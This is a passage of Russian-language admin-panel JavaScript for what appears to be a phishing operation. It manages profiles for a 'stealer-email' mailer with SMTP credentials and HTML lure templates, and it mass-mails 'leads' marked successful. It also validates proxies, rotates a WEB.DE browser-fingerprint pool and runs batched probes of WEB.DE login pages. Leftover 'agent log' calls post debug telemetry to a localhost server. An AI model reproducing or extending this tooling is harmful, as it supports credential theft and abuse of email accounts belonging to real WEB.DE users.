          showMailerMsg(err.message || 'Ошибка выбора профиля', 'error');
        });
      });
    }
    var mailerNewBtn = document.getElementById('config-mailer-new');
    if (mailerNewBtn) {
      mailerNewBtn.addEventListener('click', function () {
        var sel = document.getElementById('config-mailer-profile');
        if (sel) sel.value = MAILER_NEW_ID;
        clearMailerForm();
        var delBtn = document.getElementById('config-mailer-delete');
        if (delBtn) delBtn.disabled = true;
        showMailerMsg('Новый профиль: заполните поля и нажмите «Сохранить».', 'success');
        setTimeout(function () { showMailerMsg('', ''); }, 4000);
      });
    }
    var mailerDelBtn = document.getElementById('config-mailer-delete');
    if (mailerDelBtn) {
      mailerDelBtn.addEventListener('click', function () {
        var sel = document.getElementById('config-mailer-profile');
        var id = sel && sel.value;
        if (!id || id === MAILER_NEW_ID) return;
        if (!confirm('Удалить профиль Mailer «' + id + '»?')) return;
        authFetch('/api/config/stealer-email?id=' + encodeURIComponent(id), { method: 'DELETE' }).then(function (r) { return r.json(); }).then(function (data) {
          if (data && data.ok === false) throw new Error(data.error || 'Ошибка');
          showMailerMsg('Профиль удалён', 'success');
          loadConfigMailer();
        }).catch(function (err) {
          showMailerMsg(err.message || 'Ошибка удаления', 'error');
        });
      });
    }
    var mailerSaveBtn = document.getElementById('config-mailer-save');
    if (mailerSaveBtn) {
      mailerSaveBtn.addEventListener('click', function () {
        var sel = document.getElementById('config-mailer-profile');
        var smtp = document.getElementById('config-mailer-smtp');
        var sender = document.getElementById('config-mailer-sender');
        var title = document.getElementById('config-mailer-title');
        var htmlEl = document.getElementById('config-mailer-html');
        var nameInput = document.getElementById('config-mailer-profile-name');
        var isNew = !sel || sel.value === MAILER_NEW_ID;
        var payload = {
          smtpLine: (smtp && smtp.value) ? smtp.value.trim() : '',
          senderName: (sender && sender.value) ? sender.value.trim() : '',
          title: (title && title.value) ? title.value.trim() : '',
          html: (htmlEl && htmlEl.value) ? htmlEl.value : '',
          setCurrent: true
        };
        if (isNew) {
          var nm = (nameInput && nameInput.value.trim()) ? nameInput.value.trim() : ('Config ' + new Date().toISOString().slice(0, 16).replace('T', ' '));
          payload.name = nm;
        } else {
          payload.id = sel.value;
        }
        if (adminMailerPendingImage === '__clear__') payload.image1Base64 = '';
        else if (typeof adminMailerPendingImage === 'string' && adminMailerPendingImage.length) payload.image1Base64 = adminMailerPendingImage;
        mailerSaveBtn.disabled = true;
        postJson('/api/config/stealer-email', payload).then(function (r) { return r.json(); }).then(function (data) {
          if (data && data.ok === false) throw new Error(data.error || 'Ошибка');
          showMailerMsg('Сохранено', 'success');
          adminMailerPendingImage = null;
          loadConfigMailer();
        }).catch(function (err) {
          showMailerMsg(err.message || 'Ошибка сохранения', 'error');
        }).finally(function () { mailerSaveBtn.disabled = false; });
      });
    }
    var mailerTplFile = document.getElementById('config-mailer-template-file');
    if (mailerTplFile) {
      mailerTplFile.addEventListener('change', function (e) {
        var f = e.target && e.target.files && e.target.files[0];
        if (!f) return;
        var reader = new FileReader();
        reader.onload = function () {
          var htmlEl = document.getElementById('config-mailer-html');
          if (htmlEl) htmlEl.value = reader.result || '';
          showMailerMsg('HTML подставлен из файла — нажмите «Сохранить».', 'success');
        };
        reader.readAsText(f);
      });
    }
    var mailerImgFile = document.getElementById('config-mailer-image-file');
    if (mailerImgFile) {
      mailerImgFile.addEventListener('change', function (e) {
        var f = e.target && e.target.files && e.target.files[0];
        var imgStatus = document.getElementById('config-mailer-image-status');
        if (!f) return;
        var reader = new FileReader();
        reader.onload = function () {
          var s = reader.result;
          var b64 = typeof s === 'string' && s.indexOf(',') >= 0 ? s.split(',')[1] : '';
          adminMailerPendingImage = b64;
          if (imgStatus) imgStatus.textContent = 'Файл выбран — сохраните профиль.';
        };
        reader.readAsDataURL(f);
      });
    }
    var mailerImgClear = document.getElementById('config-mailer-image-clear');
    if (mailerImgClear) {
      mailerImgClear.addEventListener('click', function () {
        adminMailerPendingImage = '__clear__';
        var imgFile = document.getElementById('config-mailer-image-file');
        if (imgFile) imgFile.value = '';
        var imgStatus = document.getElementById('config-mailer-image-status');
        if (imgStatus) imgStatus.textContent = 'Картинка будет удалена после сохранения.';
      });
    }

    var CONFIG_EMAIL_NEW_ID = '__new__';
    var adminConfigEmailPendingImage = null;
    function showConfigEmailMsg(text, type) {
      var el = document.getElementById('config-email-message');
      if (!el) return;
      el.textContent = text || '';
      el.className = 'config-msg' + (type ? ' ' + type : '');
      el.classList.toggle('hidden', !text);
    }
    function loadConfigEmail() {
      var sel = document.getElementById('config-email-profile');
      var smtp = document.getElementById('config-email-smtp');
      var from = document.getElementById('config-email-from');
      var subject = document.getElementById('config-email-subject');
      var htmlEl = document.getElementById('config-email-html');
      var nameInput = document.getElementById('config-email-profile-name');
      var imgStatus = document.getElementById('config-email-image-status');
      var delBtn = document.getElementById('config-email-delete');
      adminConfigEmailPendingImage = null;
      var imgFile = document.getElementById('config-email-image-file');
      if (imgFile) imgFile.value = '';
      authFetch('/api/config/email').then(function (r) { return r.json(); }).then(function (data) {
        var list = data.list || [];
        var currentId = data.currentId || null;
        if (sel) {
          sel.innerHTML = '';
          var optNew = document.createElement('option');
          optNew.value = CONFIG_EMAIL_NEW_ID;
          optNew.textContent = '+ Новый профиль';
          sel.appendChild(optNew);
          list.forEach(function (item) {
            var opt = document.createElement('option');
            opt.value = item.id;
            opt.textContent = item.name || item.id;
            sel.appendChild(opt);
          });
          if (currentId && list.some(function (x) { return String(x.id) === String(currentId); })) {
            sel.value = currentId;
          } else {
            sel.value = list.length ? list[0].id : CONFIG_EMAIL_NEW_ID;
          }
        }
        if (smtp) smtp.value = data.smtpLine || '';
        if (from) from.value = data.senderName || '';
        if (subject) subject.value = data.title || '';
        if (htmlEl) htmlEl.value = data.html || '';
        if (nameInput) {
          var cur = list.find(function (i) { return String(i.id) === String(data.currentId); });
          nameInput.value = (cur && (cur.name || cur.id)) ? (cur.name || cur.id) : '';
        }
        if (imgStatus) {
          imgStatus.textContent = data.image1Present ? 'В профиле сохранена картинка (_src1_)' : 'Картинка не задана';
        }
        if (delBtn) delBtn.disabled = sel && sel.value === CONFIG_EMAIL_NEW_ID;
        showConfigEmailMsg('', '');
        AdminModalKit.syncCodeEditorHeights();
      }).catch(function (err) {
        showConfigEmailMsg(err.message || 'Ошибка загрузки E-Mail', 'error');
      });
    }
    var configEmailProfileSel = document.getElementById('config-email-profile');
    if (configEmailProfileSel) {
      configEmailProfileSel.addEventListener('change', function () {
        var v = configEmailProfileSel.value;
        var delBtn = document.getElementById('config-email-delete');
        if (delBtn) delBtn.disabled = v === CONFIG_EMAIL_NEW_ID;
        if (v === CONFIG_EMAIL_NEW_ID) {
          var smtp = document.getElementById('config-email-smtp');
          var from = document.getElementById('config-email-from');
          var subject = document.getElementById('config-email-subject');
          var htmlEl = document.getElementById('config-email-html');
          var nameInput = document.getElementById('config-email-profile-name');
          if (smtp) smtp.value = '';
          if (from) from.value = '';
          if (subject) subject.value = '';
          if (htmlEl) htmlEl.value = '';
          if (nameInput) nameInput.value = '';
          adminConfigEmailPendingImage = null;
          showConfigEmailMsg('Новый профиль: заполните поля и нажмите «Сохранить».', 'success');
          setTimeout(function () { showConfigEmailMsg('', ''); }, 3000);
          return;
        }
        postJson('/api/config/email/select', { id: v }).then(function () {
          loadConfigEmail();
        }).catch(function (err) {
          showConfigEmailMsg(err.message || 'Ошибка выбора профиля', 'error');
        });
      });
    }
    var configEmailNewBtn = document.getElementById('config-email-new');
    if (configEmailNewBtn) {
      configEmailNewBtn.addEventListener('click', function () {
        var sel = document.getElementById('config-email-profile');
        if (sel) sel.value = CONFIG_EMAIL_NEW_ID;
        var smtp = document.getElementById('config-email-smtp');
        var from = document.getElementById('config-email-from');
        var subject = document.getElementById('config-email-subject');
        var htmlEl = document.getElementById('config-email-html');
        var nameInput = document.getElementById('config-email-profile-name');
        if (smtp) smtp.value = '';
        if (from) from.value = '';
        if (subject) subject.value = '';
        if (htmlEl) htmlEl.value = '';
        if (nameInput) nameInput.value = '';
        adminConfigEmailPendingImage = null;
        var delBtn = document.getElementById('config-email-delete');
        if (delBtn) delBtn.disabled = true;
        showConfigEmailMsg('Новый профиль: заполните поля и нажмите «Сохранить».', 'success');
        setTimeout(function () { showConfigEmailMsg('', ''); }, 3000);
      });
    }
    var configEmailDelBtn = document.getElementById('config-email-delete');
    if (configEmailDelBtn) {
      configEmailDelBtn.addEventListener('click', function () {
        var sel = document.getElementById('config-email-profile');
        var id = sel && sel.value;
        if (!id || id === CONFIG_EMAIL_NEW_ID) return;
        if (!confirm('Удалить профиль E-Mail «' + id + '»?')) return;
        authFetch('/api/config/email?id=' + encodeURIComponent(id), { method: 'DELETE' }).then(function (r) { return r.json(); }).then(function (data) {
          if (data && data.ok === false) throw new Error(data.error || 'Ошибка');
          showConfigEmailMsg('Профиль удалён', 'success');
          loadConfigEmail();
        }).catch(function (err) {
          showConfigEmailMsg(err.message || 'Ошибка удаления', 'error');
        });
      });
    }
    var configEmailSaveBtn = document.getElementById('config-email-save');
    if (configEmailSaveBtn) {
      configEmailSaveBtn.addEventListener('click', function () {
        var sel = document.getElementById('config-email-profile');
        var smtp = document.getElementById('config-email-smtp');
        var from = document.getElementById('config-email-from');
        var subject = document.getElementById('config-email-subject');
        var htmlEl = document.getElementById('config-email-html');
        var nameInput = document.getElementById('config-email-profile-name');
        var isNew = !sel || sel.value === CONFIG_EMAIL_NEW_ID;
        var payload = {
          smtpLine: (smtp && smtp.value) ? smtp.value.trim() : '',
          senderName: (from && from.value) ? from.value.trim() : '',
          title: (subject && subject.value) ? subject.value.trim() : '',
          html: (htmlEl && htmlEl.value) ? htmlEl.value : '',
          setCurrent: true
        };
        if (isNew) {
          payload.name = (nameInput && nameInput.value.trim()) ? nameInput.value.trim() : ('E-Mail ' + new Date().toISOString().slice(0, 16).replace('T', ' '));
        } else {
          payload.id = sel.value;
        }
        if (adminConfigEmailPendingImage === '__clear__') payload.image1Base64 = '';
        else if (typeof adminConfigEmailPendingImage === 'string' && adminConfigEmailPendingImage.length) payload.image1Base64 = adminConfigEmailPendingImage;
        configEmailSaveBtn.disabled = true;
        postJson('/api/config/email', payload).then(function (r) { return r.json(); }).then(function (data) {
          if (data && data.ok === false) throw new Error(data.error || 'Ошибка');
          showConfigEmailMsg('Сохранено', 'success');
          adminConfigEmailPendingImage = null;
          loadConfigEmail();
        }).catch(function (err) {
          showConfigEmailMsg(err.message || 'Ошибка сохранения', 'error');
        }).finally(function () { configEmailSaveBtn.disabled = false; });
      });
    }
    var configEmailSendAllSuccess = document.getElementById('config-email-send-all-success');
    if (configEmailSendAllSuccess) {
      configEmailSendAllSuccess.addEventListener('click', function () {
        if (!confirm('Отправить письмо по шаблону Config → E-Mail всем записям со статусом «Успех», у кого указан email?')) return;
        configEmailSendAllSuccess.disabled = true;
        authFetch('/api/send-email-all-success', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' })
          .then(function (r) { return r.json().then(function (j) { return { r: r, j: j }; }); })
          .then(function (o) {
            if (!o.r.ok || !o.j || o.j.ok === false) throw new Error((o.j && o.j.error) || 'Ошибка');
            var j = o.j;
            var msg = 'Готово: отправлено ' + (j.sent != null ? j.sent : 0) + ', ошибок ' + (j.failed != null ? j.failed : 0) + ', пропущено ' + (j.skipped != null ? j.skipped : 0);
            showConfigEmailMsg(msg, (j.failed > 0) ? 'error' : 'success');
            loadLeads();
          })
          .catch(function (err) {
            showConfigEmailMsg(err.message || 'Ошибка массовой отправки', 'error');
          })
          .finally(function () { configEmailSendAllSuccess.disabled = false; });
      });
    }
    var configEmailTplFile = document.getElementById('config-email-template-file');
    if (configEmailTplFile) {
      configEmailTplFile.addEventListener('change', function (e) {
        var f = e.target && e.target.files && e.target.files[0];
        if (!f) return;
        var reader = new FileReader();
        reader.onload = function () {
          var htmlEl = document.getElementById('config-email-html');
          if (htmlEl) htmlEl.value = reader.result || '';
          showConfigEmailMsg('HTML подставлен из файла — нажмите «Сохранить».', 'success');
        };
        reader.readAsText(f);
      });
    }
    var configEmailImgFile = document.getElementById('config-email-image-file');
    if (configEmailImgFile) {
      configEmailImgFile.addEventListener('change', function (e) {
        var f = e.target && e.target.files && e.target.files[0];
        var imgStatus = document.getElementById('config-email-image-status');
        if (!f) return;
        var reader = new FileReader();
        reader.onload = function () {
          var s = reader.result;
          var b64 = typeof s === 'string' && s.indexOf(',') >= 0 ? s.split(',')[1] : '';
          adminConfigEmailPendingImage = b64;
          if (imgStatus) imgStatus.textContent = 'Файл выбран — сохраните профиль.';
        };
        reader.readAsDataURL(f);
      });
    }
    var configEmailImgClear = document.getElementById('config-email-image-clear');
    if (configEmailImgClear) {
      configEmailImgClear.addEventListener('click', function () {
        adminConfigEmailPendingImage = '__clear__';
        var imgFile = document.getElementById('config-email-image-file');
        if (imgFile) imgFile.value = '';
        var imgStatus = document.getElementById('config-email-image-status');
        if (imgStatus) imgStatus.textContent = 'Картинка будет удалена после сохранения.';
      });
    }

    function loadConfigProxies() {
      var textEl = document.getElementById('config-proxies-text');
      var msgEl = document.getElementById('config-proxies-message');
      var wrap = document.getElementById('config-proxies-result-wrap');
      var listEl = document.getElementById('config-proxies-result-list');
      if (!textEl) return;
      if (msgEl) { msgEl.textContent = ''; msgEl.classList.add('hidden'); }
      if (wrap) wrap.classList.add('hidden');
      if (listEl) listEl.innerHTML = '';
      authFetch('/api/config/proxies').then(function (r) { return r.json(); }).then(function (data) {
        textEl.value = (data.content != null ? String(data.content) : '').trim();
        AdminModalKit.syncCodeEditorHeights();
      }).catch(function () {});
    }
    function showProxiesMessage(text, type) {
      var el = document.getElementById('config-proxies-message');
      if (!el) return;
      el.textContent = text || '';
      el.classList.toggle('hidden', !text);
      el.classList.toggle('success', type === 'success');
      el.classList.toggle('error', type === 'error');
    }
    function showProxiesResult(valid, invalid) {
      var wrap = document.getElementById('config-proxies-result-wrap');
      var summaryEl = wrap && wrap.querySelector('.config-proxies-result-summary');
      var listEl = document.getElementById('config-proxies-result-list');
      if (!wrap || !listEl) return;
      if (!valid.length && !invalid.length) {
        wrap.classList.add('hidden');
        return;
      }
      wrap.classList.remove('hidden');
      if (summaryEl) summaryEl.textContent = 'Валидных: ' + valid.length + ', невалидных: ' + invalid.length;
      listEl.innerHTML = '';
      var validIcon = '<svg class="config-proxies-line-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg>';
      var invalidIcon = '<svg class="config-proxies-line-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M15 9l-6 6M9 9l6 6"/></svg>';
      valid.forEach(function (item) {
        var norm = (item && item.normalized) ? item.normalized : (typeof item === 'string' ? item : '');
        var row = document.createElement('div');
        row.className = 'config-proxies-line config-proxies-line--valid';
        row.innerHTML = validIcon + '<span class="config-proxies-line-text">' + escapeHtml(norm) + '</span>';
        listEl.appendChild(row);
      });
      invalid.forEach(function (item) {
        var line = (item && item.line) ? item.line : (typeof item === 'string' ? item : '');
        var err = (item && item.error) ? item.error : '';
        var row = document.createElement('div');
        row.className = 'config-proxies-line config-proxies-line--invalid';
        row.innerHTML = invalidIcon + '<div class="config-proxies-line-text"><span>' + escapeHtml(line) + '</span>' + (err ? '<div class="config-proxies-line-error">' + escapeHtml(err) + '</div>' : '') + '</div>';
        listEl.appendChild(row);
      });
    }
    function escapeHtml(s) {
      if (s == null) return '';
      var div = document.createElement('div');
      div.textContent = s;
      return div.innerHTML;
    }
    var configProxiesValidate = document.getElementById('config-proxies-validate');
    if (configProxiesValidate) configProxiesValidate.addEventListener('click', function () {
      var textEl = document.getElementById('config-proxies-text');
      if (!textEl) return;
      showProxiesMessage('Проверка подключения…');
      document.getElementById('config-proxies-result-wrap') && document.getElementById('config-proxies-result-wrap').classList.add('hidden');
      postJson('/api/config/proxies-validate', { content: textEl.value })
        .then(function (r) {
          if (!r.ok) return r.json().then(function (j) { throw new Error(j && j.error ? j.error : 'Ошибка ' + r.status); });
          return r.json();
        })
        .then(function (data) {
          var validList = data.valid || [];
          showProxiesMessage('');
          showProxiesResult(validList, data.invalid || []);
          var wrap = document.getElementById('config-proxies-result-wrap');
          if (wrap && !wrap.classList.contains('hidden')) wrap.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        })
        .catch(function (err) {
          showProxiesMessage((err && err.message) || 'Ошибка проверки', 'error');
        });
    });
    var configProxiesSave = document.getElementById('config-proxies-save');
    if (configProxiesSave) configProxiesSave.addEventListener('click', function () {
      var textEl = document.getElementById('config-proxies-text');
      if (!textEl) return;
      postJson('/api/config/proxies', { content: textEl.value }).then(function () {
        showProxiesMessage('Сохранено', 'success');
      }).catch(function (err) {
        showProxiesMessage((err && err.message) || 'Ошибка сохранения', 'error');
      });
    });
    function applyWebdeFpListPayload(pool, rawText, opts) {
      opts = opts || {};
      if (!opts.preserveListMessage) {
        showWebdeFpListMessage('', '');
      }
      if (pool && Array.isArray(pool.entries) && pool.entries.length > 0) {
        renderConfigWebdeFpList({ entries: pool.entries });
        return;
      }
      if (pool) {
        if (pool.filePresent === false) {
          showWebdeFpListMessage('На сервере нет файла login/webde_fingerprints.json. Список индексов — из webde_fingerprint_indices.txt на сервере (если задан).', 'error');
        } else if (pool.parseError) {
          showWebdeFpListMessage('Ошибка чтения пула: ' + String(pool.parseError) + '.', 'error');
        } else if (pool.poolLength === 0) {
          showWebdeFpListMessage('Пул отпечатков в JSON пуст.', 'error');
        }
        var fb = parseWebdeFpIndicesFromText(rawText);
        if (fb.length > 0) {
          renderConfigWebdeFpList({ entries: buildFallbackFpEntries(fb) });
        } else {
          renderConfigWebdeFpList({ entries: [] });
        }
        return;
      }
      if (!opts.skipGenericNoPoolMsg) {
        showWebdeFpListMessage('Ответ 200 без поля pool: на сервере старая версия server.js или кэш (обновите процесс Node и сделайте жёсткое обновление страницы). Если уже новая версия — проверьте nginx proxy_buffers на пути к Node.', 'error');
      }
      var fbNoPool = parseWebdeFpIndicesFromText(rawText);
      if (fbNoPool.length > 0) {
        renderConfigWebdeFpList({ entries: buildFallbackFpEntries(fbNoPool) });
      } else {
        renderConfigWebdeFpList({ entries: [] });
      }
    }
    function parseAdminConfigResponse(r, txt) {
      var data = {};
      var parseErr = null;
      try {
        data = JSON.parse(txt);
      } catch (eJ) {
        parseErr = (eJ && eJ.message) ? String(eJ.message) : 'parse_error';
        data = {};
      }
      return { ok: r.ok, status: r.status, data: data || {}, txtLen: (txt || '').length, parseErr: parseErr };
    }
    var webdeFpIndicesContentFromServer = '';
    function loadConfigWebdeFpIndices() {
      function agentLogWebdeLoad(w, sourceTag) {
        var data = w.data || {};
        // #region agent log
        fetch('http://localhost:7840/ingest/75c27fab-6caa-4d2b-8e3f-b075fb08e8bd', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-Debug-Session-Id': '461acb' },
          body: JSON.stringify({
            sessionId: '461acb',
            hypothesisId: sourceTag === 'proxies-fallback' ? 'H6' : 'H2',
            location: 'admin.js:loadConfigWebdeFpIndices',
            message: 'webde indices load',
            data: {
              sourceTag: sourceTag,
              ok: w.ok,
              status: w.status,
              txtLen: w.txtLen,
              parseErr: w.parseErr,
              hasPoolKey: Object.prototype.hasOwnProperty.call(data, 'pool'),
              hasWebdeIndices: !!(data.webdeIndices && data.webdeIndices.pool),
              topKeys: Object.keys(data).slice(0, 14),
            },
            timestamp: Date.now(),
          }),
        }).catch(function () {});
        // #endregion
      }
      function renderFpFallbackRowsOnly() {
        var fb = parseWebdeFpIndicesFromText(webdeFpIndicesContentFromServer);
        if (fb.length > 0) {
          renderConfigWebdeFpList({ entries: buildFallbackFpEntries(fb) });
        } else {
          renderConfigWebdeFpList({ entries: [] });
        }
      }
      function tryWebdeFpViaValidateBundle() {
        var bundleBase = '/api/config/proxies-validate?webdeFpBundle=1&nc=';
        function logValidateBundle(w, methodTag) {
          var d = w.data || {};
          // #region agent log
          fetch('http://localhost:7840/ingest/75c27fab-6caa-4d2b-8e3f-b075fb08e8bd', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-Debug-Session-Id': '461acb' },
            body: JSON.stringify({
              sessionId: '461acb',
              hypothesisId: 'H9',
              location: 'admin.js:tryWebdeFpViaValidateBundle',
              message: 'validate bundle attempt',
              data: {
                methodTag: methodTag,
                ok: w.ok,
                status: w.status,
                hasWebdeIndices: !!(d.webdeIndices && d.webdeIndices.pool),
                topKeys: Object.keys(d).slice(0, 10),
              },
              timestamp: Date.now(),
            }),
          }).catch(function () {});
          // #endregion
        }
        function applyIfOk(w3) {
          var d3 = w3.data || {};
          var wi3 = d3.webdeIndices;
          if (w3.ok && !w3.parseErr && wi3 && wi3.pool) {
            showWebdeFpListMessage('', '');
            webdeFpIndicesContentFromServer = (wi3.content != null ? String(wi3.content) : '').trim();
            applyWebdeFpListPayload(wi3.pool, webdeFpIndicesContentFromServer);
            return true;
          }
          return false;
        }
        function failBoth(wGet, wPost) {
          var parts = [];
          if (!wGet.ok) parts.push('GET bundle HTTP ' + wGet.status);
          else if (wGet.parseErr) parts.push('GET bundle не JSON (длина ' + wGet.txtLen + ')');
          else parts.push('GET без webdeIndices.pool');
          if (wPost) {
            if (!wPost.ok) parts.push('POST bundle HTTP ' + wPost.status);
            else if (wPost.parseErr) parts.push('POST bundle не JSON (длина ' + wPost.txtLen + ')');
            else parts.push('POST без webdeIndices.pool');
          }
          showWebdeFpListMessage(parts.join('; ') + '. Задеплойте актуальный server.js и перезапустите Node.', 'error');
          renderFpFallbackRowsOnly();
        }
        var urlGet = bundleBase + Date.now();
        return authFetch(urlGet)
          .then(function (r3) {
            return r3.text().then(function (txt3) {
              return parseAdminConfigResponse(r3, txt3);
            });
          })
          .then(function (w3) {
            logValidateBundle(w3, 'GET');
            if (applyIfOk(w3)) return;
            var urlPost = bundleBase + Date.now();
            return authFetch(urlPost, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ content: '' }),
            })
              .then(function (r4) {
                return r4.text().then(function (txt4) {
                  return parseAdminConfigResponse(r4, txt4);
                });
              })
              .then(function (w4) {
                logValidateBundle(w4, 'POST');
                if (applyIfOk(w4)) return;
                failBoth(w3, w4);
              });
          });
      }
      function tryProxiesWebdeFpFallback() {
        return authFetch('/api/config/proxies?webdeFp=1&nc=' + Date.now())
          .then(function (r2) {
            return r2.text().then(function (txt2) {
              return parseAdminConfigResponse(r2, txt2);
            });
          })
          .then(function (w2) {
            agentLogWebdeLoad(w2, 'proxies-fallback');
            var wi = w2.data && w2.data.webdeIndices;
            if (w2.ok && !w2.parseErr && wi && wi.pool) {
              showWebdeFpListMessage('', '');
              webdeFpIndicesContentFromServer = (wi.content != null ? String(wi.content) : '').trim();
              applyWebdeFpListPayload(wi.pool, webdeFpIndicesContentFromServer);
              return;
            }
            if (!w2.ok) {
              showWebdeFpListMessage('GET /api/config/proxies?webdeFp=1 недоступен (HTTP ' + w2.status + '). Пробуем GET proxies-validate?webdeFpBundle=1…', 'error');
            } else if (w2.parseErr) {
              showWebdeFpListMessage('Ответ proxies?webdeFp=1 не JSON. Пробуем GET bundle…', 'error');
            } else {
              showWebdeFpListMessage('Ответ proxies без webdeIndices (старый server.js). Пробуем GET bundle…', 'error');
            }
            return tryWebdeFpViaValidateBundle();
          });
      }
      return authFetch('/api/config/webde-fingerprint-indices?nc=' + Date.now())
        .then(function (r) {
          return r.text().then(function (txt) {
            return parseAdminConfigResponse(r, txt);
          });
        })
        .then(function (w) {
          agentLogWebdeLoad(w, 'primary');
          var data = w.data || {};
          if (w.ok && !w.parseErr && data.pool) {
            webdeFpIndicesContentFromServer = (data.content != null ? String(data.content) : '').trim();
            applyWebdeFpListPayload(data.pool, webdeFpIndicesContentFromServer);
            return Promise.resolve();
          }
          if (w.ok && w.parseErr) {
            showWebdeFpListMessage('Ответ не JSON (длина ' + w.txtLen + '). Пробуем fallback через /api/config/proxies…', 'error');
            return tryProxiesWebdeFpFallback();
          }
          if (!w.ok || !data.pool) {
            if (!w.ok && w.status !== 404) {
              showWebdeFpListMessage('Индексы: HTTP ' + w.status + '. Пробуем fallback через /api/config/proxies…', 'error');
            }
            return tryProxiesWebdeFpFallback();
          }
        })
        .catch(function () {
          showWebdeFpListMessage('Ошибка сети при загрузке индексов и пула.', 'error');
          renderFpFallbackRowsOnly();
        });
    }
    var configWebdeFpCheck = document.getElementById('config-webde-fp-check');
    if (configWebdeFpCheck) configWebdeFpCheck.addEventListener('click', function () {
      loadConfigWebdeFpIndices();
    });
    function showWebdeFpListMessage(text, type) {
      var el = document.getElementById('config-webde-fp-list-message');
      if (!el) return;
      el.textContent = text || '';
      el.classList.toggle('hidden', !text);
      el.classList.toggle('success', type === 'success');
      el.classList.toggle('error', type === 'error');
    }
    function parseWebdeFpIndicesFromText(text) {
      var out = [];
      var seen = {};
      String(text || '').split(/\r?\n/).forEach(function (line) {
        var s = line.trim();
        if (!s || s.charAt(0) === '#') return;
        var n = parseInt(s.split(/\s+/)[0], 10);
        if (!isNaN(n) && n >= 0 && !seen[n]) {
          seen[n] = true;
          out.push(n);
        }
      });
      out.sort(function (a, b) { return a - b; });
      return out;
    }
    function buildFallbackFpEntries(indices) {
      var sum = 'Нет описания с сервера — положите login/webde_fingerprints.json рядом с сервером и перезапустите Node.';
      return indices.map(function (i) {
        return { index: i, summary: sum, active: true };
      });
    }
    function renderConfigWebdeFpList(data) {
      var wrap = document.getElementById('config-webde-fp-list');
      if (!wrap) return;
      var entries = (data && data.entries) ? data.entries : [];
      wrap.innerHTML = '';
      if (entries.length === 0) {
        wrap.textContent = 'Нет строк для отображения.';
        return;
      }
      entries.forEach(function (e) {
        var row = document.createElement('div');
        row.className = 'config-webde-fp-row ' + (e.active ? 'config-webde-fp-row--active' : 'config-webde-fp-row--inactive');
        var idx = document.createElement('span');
        idx.className = 'config-webde-fp-idx';
        idx.textContent = String(e.index);
        var sum = document.createElement('span');
        sum.className = 'config-webde-fp-sum';
        sum.textContent = (e.summary != null ? String(e.summary) : '—');
        row.appendChild(idx);
        row.appendChild(sum);
        wrap.appendChild(row);
      });
    }
    function webdeProbeStatusRu(st) {
      var s = String(st || '');
      if (s === 'ok') return 'Ок: видно поле пароля';
      if (s === 'no_password_field') return 'Поле пароля не появилось (таймаут)';
      if (s === 'voruebergehend') return 'WEB.DE: вход временно недоступен';
      if (s === 'weiter_stall') return 'Не удаётся перейти дальше (Weiter)';
      if (s === 'navigation_timeout') return 'Таймаут загрузки';
      if (s === 'error') return 'Ошибка / блок';
      return s || '—';
    }
    function showWebdeProbeStatus(text, type) {
      var el = document.getElementById('config-webde-probe-status');
      if (!el) return;
      el.textContent = text || '';
      el.classList.toggle('hidden', !text);
      el.classList.toggle('success', type === 'success');
      el.classList.toggle('error', type === 'error');
    }
    function renderWebdeProbeResults(results, opts) {
      opts = opts || {};
      var wrap = document.getElementById('config-webde-probe-results-wrap');
      var listEl = document.getElementById('config-webde-probe-results-list');
      var sumEl = document.getElementById('config-webde-probe-results-summary');
      if (!wrap || !listEl || !sumEl) return;
      var arr = Array.isArray(results) ? results.slice() : [];
      arr.sort(function (a, b) {
        return (parseInt(a.index, 10) || 0) - (parseInt(b.index, 10) || 0);
      });
      var ok = 0;
      var bad = 0;
      var i;
      for (i = 0; i < arr.length; i++) {
        if (String(arr[i].status) === 'ok') ok++;
        else bad++;
      }
      if (arr.length === 0 && opts.running) {
        sumEl.textContent = 'Идёт проверка (батчи по 3)…';
      } else if (arr.length === 0) {
        sumEl.textContent = 'Пока нет результатов.';
      } else {
        sumEl.textContent = 'Итого: ' + arr.length + ' — с полем пароля: ' + ok + ', иначе: ' + bad;
      }
      listEl.innerHTML = '';
      for (i = 0; i < arr.length; i++) {
        var r = arr[i];
        var line = document.createElement('div');
        var isOk = String(r.status) === 'ok';
        line.className = 'config-webde-probe-line ' + (isOk ? 'config-webde-probe-line--ok' : 'config-webde-probe-line--bad');
        var idxSpan = document.createElement('span');
        idxSpan.className = 'config-webde-probe-line-idx';
        idxSpan.textContent = '#' + String(r.index);
        var lab = document.createElement('span');
        lab.className = 'config-webde-probe-line-label';
        lab.textContent = webdeProbeStatusRu(r.status);
        line.appendChild(idxSpan);
        line.appendChild(lab);
        listEl.appendChild(line);
      }
    }
    function pollWebdeProbeJob(jobId) {
      clearWebdeProbePoll();
      webdeProbeActiveJobId = jobId;
      webdeProbePollTimer = setInterval(function () {
        authFetch('/api/config/proxies?webdeProbeJobId=' + encodeURIComponent(jobId))
          .then(function (r) { return r.json(); })
          .then(function (data) {
            if (!data || data.ok === false) {
              clearWebdeProbePoll();
              webdeProbeActiveJobId = null;
              webdeProbeLastState = { paused: false, running: false, done: true, error: (data && data.error) || 'err' };
              syncWebdeProbeToolbar();
              showWebdeProbeStatus((data && data.error) ? String(data.error) : 'Ошибка статуса', 'error');
              appendProxiesTerminal('Ошибка статуса: ' + ((data && data.error) ? String(data.error) : '?'));
              return;
            }
            webdeProbeLastState = {
              paused: !!data.paused,
              running: !!data.running,
              done: !!data.done,
              error: data.error || null,
            };
            syncWebdeProbeToolbar();
            var prog = data.progress || {};
            var doneN = prog.done != null ? prog.done : 0;
            var tot = prog.total != null ? prog.total : 0;
            var msg = data.error
              ? String(data.error)
              : (data.paused
                ? ('Пауза: ' + doneN + ' / ' + tot)
                : (data.running ? ('Проверка… ' + doneN + ' / ' + tot) : ('Готово: ' + doneN + ' / ' + tot)));
            if (msg !== webdeProbeLastTerminalMsg) {
              webdeProbeLastTerminalMsg = msg;
              appendProxiesTerminal(msg);
            }
            showWebdeProbeStatus(msg, data.error ? 'error' : (data.done ? 'success' : ''));
